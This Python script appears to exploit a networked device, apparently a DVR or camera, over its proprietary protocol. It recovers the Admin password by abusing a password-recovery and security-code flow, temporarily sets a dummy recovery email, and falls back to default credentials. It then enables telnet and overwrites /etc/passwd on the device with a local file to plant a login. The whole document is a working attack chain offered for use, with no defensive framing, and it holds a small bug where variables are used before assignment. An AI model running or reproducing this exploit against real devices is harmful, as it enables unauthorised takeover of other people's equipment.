import sys, crypt, hashlib, base64, threading, time, io, select
from lib import decode, Channel
from lib.crypt import td_decrypt


def try_set_mail(conn, target):
  conn.send_msg(['PROXY', 'USER', 'RESERVEPHONE', '2', '1', target, 'FILETRANSPORT'])
  resp = conn.recv_msg()
  return resp[4:7] == ['RESERVEPHONE', '2', '1']

def get_psw_code(conn):
  conn.send_msg(['IP', 'USER', 'LOGON', base64.b64encode(b'Admin').decode(), base64.b64encode(b'Admin').decode(), '', '65536', 'UTF-8', '0', '1'])
  resp = conn.recv_msg()
  if resp[4] != 'FINDPSW':
    return False
  psw_reg = psw_data = None
  if len(resp) > 7:
    psw_reg = resp[6]
    psw_data = resp[7]
  if not psw_data:
    return None
  psw_type = int(resp[5])
  if psw_type not in (1, 2, 3):
    raise Exception('unsupported psw type: '+str(psw_type))
  if psw_type == 3:
    psw_data = psw_data.split('"')[3]
  if psw_type == 1:
    psw_data = psw_data.split(':')[1]
    psw_key = psw_reg[:0x1f]
  elif psw_type in (2, 3):
    psw_key = psw_reg[:4].lower()
  psw_code = td_decrypt(psw_data.encode(), psw_key.encode())    
  code = hashlib.md5(psw_code).hexdigest()[24:]
  return code
  
  
def recover_with_code(conn, code, crypt_key):
  conn.send_msg(['IP', 'USER', 'SECURITYCODE', code, 'FILETRANSPORT'])
  resp = conn.recv_msg()
  rcode = int(resp[6])
  if rcode == 0:
    return rcode, decode(resp[8].encode(), crypt_key).decode()
  return rcode, None
  
def recover_with_default(conn, crypt_key):
  res = conn.login_with_key(b'Default', b'Default', crypt_key)
  if not res:
    return False
  while True:
    msg = conn.recv_msg()
    if msg[1:5] == ['IP', 'INNER', 'SUPER', 'GETUSERINFO']:
      return decode(msg[6].encode(), crypt_key).decode(), decode(msg[7].encode(), crypt_key).decode()


def recover(host):  
  conn = Channel(host)
  conn.connect()
  crypt_key = conn.get_crypt_key(65536)
  attempts = 2
  tried_to_set_mail = False
  ok = False
  while attempts > 0:
    attempts -= 1
    code = get_psw_code(conn)
    if code == False:
      break
    elif code == None:
      if not tried_to_set_mail:
        print("no psw data found, we'll try to set it", file=sys.stderr)
        tried_to_set_mail = True
        if try_set_mail(conn, 'a@a.a'):
          code = get_psw_code(conn)
    if code == None:
      print("couldn't set mail", file=sys.stderr)
      break
    rcode, password = recover_with_code(conn, code, crypt_key)
    if rcode == 5:  
      print('The device is locked, try again later.', file=sys.stderr)
      break
    if rcode == 0:
      creds = ['Admin', password]
      return creds
      ok = True
      break           
  if tried_to_set_mail:
    try_set_mail(conn, '')
  
  if not code:
    print("psw is not supported, trying default credentials", file=sys.stderr)
    credentials = recover_with_default(conn, crypt_key)
    if credentials:
      creds = [user, pw]
      user, pw = credentials
      return creds
      ok = True
  if not ok:
    print('Recovery failed', file=sys.stderr)
    exit(1)


def enabletelnet(host, creds):
  mode = 'enable'
  main = Channel(host)
  main.connect()
  crypt_key = main.login(creds[0].encode(), creds[1].encode())
  if not crypt_key:
    print('Login failed.')
    exit(1)
  main.send_msg(['PROXY', 'PARASET', 'COMMONENABLE', '73748', '0', '1' if mode == 'enable' else '0'])
  time.sleep(1)

def setpassw(host, usern, passw):
  uname = usern.encode()
  pw = passw.encode()
  mode = 'put'
  fname = '/etc/passwd'
  main = Channel(host)
  main.connect()
  crypt_key = main.login(uname, pw)
  if not crypt_key:
    print('Login failed. This method requires valid credentials.')
    exit(1)
  cmd_id = 0
  while True:
    msg = main.recv_msg()
    if not msg[0]:
      continue
    if len(msg) > 4 and msg[3] == 'CMDID':
      cmd_id = int(msg[4])
      break
    elif len(msg) > 3 and msg[2] == 'CMDID':
      cmd_id = int(msg[3])
      break
  class RecvThread(threading.Thread):
    ping_timeout = 5
    def __init__(self, chan, *args, **kwargs):
      self.chan = chan
      self.running = True
      super().__init__(*args, daemon=True, **kwargs)
  
    def run(self):
      last_ping = time.time()
      while self.running:
        r, _, _ = select.select([self.chan], [], [], self.ping_timeout)
        if self.chan in r:
          x = self.chan.recv()
        now = time.time()
        if now - last_ping > self.ping_timeout:
          self.chan.send_msg([])
  recv_thread = RecvThread(main)
  recv_thread.start()
  tx = Channel(host)
  tx.connect()
  if mode == 'put':
    file = open("passwd.txt", "r") 
    data = file.read().encode()
    data_size = len(data)
    cksum = sum(data)
    tx.send_msg(['IP', 'CMD', 'FILETRANSPORT', str(cmd_id), '0', str(data_size), str(cksum), '0', fname, '0'])
    resp = tx.recv_msg()
    if resp[4] != 'FILETRANSPORT':
      print("unrecognized response", resp, file=sys.stderr)
      sys.exit(1)
    if resp[5] != '0':
      print("can't upload there", resp, file=sys.stderr)
      sys.exit(1)
    for offset in range(0, data_size, 1000):
      tx.send_data(0, data[offset:offset+1000])
    resp = tx.recv_msg()
    if resp[4] == 'FILETRANSPORT':
      print('Sent passwd file.')
    else:
      print("possible error", resp)

def run(host):
  print("Recovering creds...")
  creds = recover(host)
  print(creds)
  print("Enabling telnet...")
  enabletelnet(host, creds)
  print("Adding login...")
  setpassw(host, creds[0], creds[1])

run(sys.argv[1])